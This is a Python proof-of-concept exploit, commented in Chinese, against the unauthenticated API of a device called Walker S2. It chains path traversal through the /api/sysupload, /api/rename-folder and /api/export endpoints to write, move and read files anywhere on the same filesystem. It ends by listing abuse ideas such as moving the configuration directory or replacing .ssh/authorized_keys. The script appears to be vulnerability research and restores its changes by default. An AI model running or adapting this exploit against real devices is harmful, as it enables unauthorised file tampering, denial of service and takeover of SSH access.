#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Walker S2 · /api/rename-folder 无认证任意目录/文件移动 PoC（无害闭环）

真实 API 签名（openapi.json RenameRequest，2026-08-29 实测修正）:
    POST /api/rename-folder
    {"old_name": "...", "new_name": "...", "target_dir": "..."}   # target_dir 默认 /etc/walker/map
语义: os.rename(target_dir/old_name, target_dir/new_name)
    - 无认证
    - target_dir 任意（默认 /etc/walker/map，可指定任意宿主路径如 /etc、/home/walker）
    - old_name / new_name 未过滤 "/" 与 ".." → 可穿越出 target_dir
    - 同设备内任意移动 ✅；跨挂载点报 EXDEV（Cross-device link）受限

链路:
    1. 用 /api/sysupload 在 /etc/walker/map/ 下建探针目录 _poc_<rand>/
    2. rename-folder 同设备跨目录移动: new_name=../_poc_<rand>_moved → /etc/walker/
    3. 用 /api/export 读回验证文件出现在 /etc/walker/
    4. 移回原处（--no-restore 不还原）

用法:
    python rename_folder_poc.py
"""
import argparse
import io
import json
import secrets
import sys
import tarfile
import time

import requests

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

MAP_ROOT = "/etc/walker/map"


def traversal(abs_path: str) -> str:
    depth = len([s for s in MAP_ROOT.split("/") if s])
    return "../" * depth + abs_path.lstrip("/")


def export_read(base: str, abs_path: str):
    """export 路径穿越读回验证；返回 tar 成员列表或 HTTP 错误串"""
    r = requests.post(f"{base}/api/export",
                      json={"map_names": [traversal(abs_path)]}, timeout=15)
    if r.status_code == 200:
        t = tarfile.open(fileobj=io.BytesIO(r.content), mode="r:*")
        return [m.name for m in t.getmembers()]
    return f"HTTP {r.status_code}"


def main():
    ap = argparse.ArgumentParser(description="/api/rename-folder 无认证任意移动")
    ap.add_argument("--host", default="192.168.11.3")
    ap.add_argument("--no-restore", action="store_true", help="验证后不移回原处")
    args = ap.parse_args()
    base = f"http://{args.host}:5000"
    rand = secrets.token_hex(4)
    name = f"_poc_{rand}"

    print("=" * 66)
    print("[*] 漏洞   : /api/rename-folder 无认证任意目录/文件移动")
    print("[*] 签名   : {old_name, new_name, target_dir=/etc/walker/map}")
    print(f"[*] 目标   : {base}/api/rename-folder")
    print(f"[*] 探针   : {MAP_ROOT}/{name}/")
    print("=" * 66)

    # 1. 建探针目录（sysupload 会把 path 建成目录、文件放里面）
    print(f"\n[1] 建探针目录（sysupload）→ {MAP_ROOT}/{name}/probe.txt")
    files = {"file": ("probe.txt", f"rename probe {rand}\n".encode())}
    data = {"path": f"{MAP_ROOT}/{name}", "board_name": "vision"}
    r = requests.post(f"{base}/api/sysupload", files=files, data=data, timeout=15)
    print(f"    HTTP {r.status_code}  {r.text[:150]}")
    time.sleep(0.3)

    # 2. 同设备跨目录移动: /etc/walker/map/X → /etc/walker/X_moved
    body = {"old_name": name, "new_name": f"../{name}_moved", "target_dir": MAP_ROOT}
    print(f"\n[2] rename-folder 跨目录移动（new_name 带 ../ 穿越）")
    print(f"    POST {base}/api/rename-folder  body={json.dumps(body)}")
    r = requests.post(f"{base}/api/rename-folder", json=body, timeout=15)
    print(f"    HTTP {r.status_code}  {r.text[:250]}")
    time.sleep(0.3)

    # 3. 读回验证（出现在 /etc/walker/ 下）
    print(f"\n[3] export 读回验证")
    print(f"    原位置 {MAP_ROOT}/{name}      : {export_read(base, f'{MAP_ROOT}/{name}')}")
    moved = export_read(base, f"/etc/walker/{name}_moved")
    print(f"    新位置 /etc/walker/{name}_moved: {moved}")
    ok = isinstance(moved, list)
    print(f"[+] 任意移动成功 ✅（同设备跨目录，文件已到 /etc/walker/）" if ok else "[!] 移动验证失败")

    # 4. 还原
    if not args.no_restore and ok:
        print(f"\n[4] 还原: 移回 {MAP_ROOT}/{name}")
        body2 = {"old_name": f"{name}_moved", "new_name": f"map/{name}", "target_dir": "/etc/walker"}
        r = requests.post(f"{base}/api/rename-folder", json=body2, timeout=15)
        print(f"    HTTP {r.status_code}  {r.text[:150]}")
        back = export_read(base, f"{MAP_ROOT}/{name}")
        print(f"    还原读回: {back}  {'✅ 已还原' if isinstance(back, list) else ''}")

    print("\n[*] 危害示例:")
    print("    target_dir=/etc  old_name=walker  → 无认证改名/移走配置目录（DoS/配置丢失）")
    print("    target_dir=/home/walker  old_name=.ssh/authorized_keys → 移走/替换授权文件")
    print("    限制: 跨挂载点 os.rename 报 EXDEV，仅同设备内任意移动")


if __name__ == "__main__":
    main()
